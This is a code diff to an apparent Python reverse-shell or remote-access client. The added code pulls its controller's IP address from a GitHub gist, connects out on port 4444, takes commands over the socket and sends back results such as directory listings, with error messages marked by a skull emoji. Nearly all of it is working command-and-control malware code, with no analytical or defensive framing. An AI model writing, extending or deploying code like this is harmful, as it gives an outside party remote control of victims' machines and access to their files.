@@ -1,9 +1,24 @@
 import socket  
 import os
 import subprocess
+import requests
+
+GIST_RAW_URL = "https://gist.githubusercontent.com/daviwll/a8c3564129a5db5ba5e5adcae70cea4b/raw/fd05499963671eb0c5cef4d1c31f27fddd89362d/ip.txt"
+
+def get_server_ip():
+    try:
+        response = requests.get(GIST_RAW_URL)
+        return response.text.strip()
+    except:
+        return None
 
 def connect_server():
-    host = socket.gethostbyname(socket.gethostname())  # Nome do host para o servidor, vai ser alterado depois
+    host = get_server_ip() 
+
+    if not host:
+        print("Não foi possível obter o IP do servidor.")
+        return
+  
     port = 4444  # Porta TCP
 
     try:
@@ -12,6 +27,7 @@ def connect_server():
 
         # Recebe o IP do servidor enviado logo após a conexão
         server_ip_message = s.recv(1024).decode()
+
         if server_ip_message.startswith("SERVER_IP"):
             server_ip = server_ip_message.split()[1]
             print(f"Conectando ao servidor no IP: {server_ip}")
@@ -33,9 +49,8 @@ def connect_server():
 
             elif command == 'ls':
                 try:
-                    archives = os.listdir()
-                    answer = "\n".join(archives)
-                    s.send(answer.encode())
+                    files = "\n".join(os.listdir())
+                    s.send(files.encode())
                 except Exception as e:
                     s.send(f"[ERROR ☠️] {e}".encode())
 
